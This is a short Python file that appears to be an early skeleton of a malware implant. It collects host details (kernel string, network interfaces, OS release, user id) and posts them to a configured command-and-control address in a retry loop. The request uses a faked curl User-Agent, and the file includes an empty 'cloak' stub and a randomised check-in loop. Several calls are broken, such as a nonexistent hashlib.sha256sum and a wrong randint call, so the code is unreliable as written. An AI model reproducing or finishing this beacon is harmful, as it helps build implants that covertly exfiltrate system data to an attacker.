import hashlib
import random
from time import sleep

import subprocess
from urllib import request, parse

import os

c2 = 'localhost:5000/'
loc = ''


def cloak():
    pass


def parse_msg(html):
    pass


def register():
    while True:
        r = None
        try:
            r = request.urlopen(c2 + loc, data=parse.urlencode(info), headers={'User-Agent': 'curl/7.54.0'})
        except Exception as e:
            print(e)
        if r and r.getcode() == 200:
            return parse_msg(r.read())
        else:
            print("Failed, trying again in 60 sec...")
            sleep(60)


def check_in():
    pass


def get_info():
    k = subprocess.check_output(['uname', '-a'])
    i = subprocess.check_output(['ifconfig'])
    o = open('/etc/os-release').read()
    u = os.getuid()
    return (('k', k), ('i', i), ('o', o), ('u', u)), hashlib.sha256sum(k + i + o)


if __name__ == '__main__':
    info, key = get_info()
    cloak()
    register()
    while True:
        check_in()
        sleep(random.randint(60))
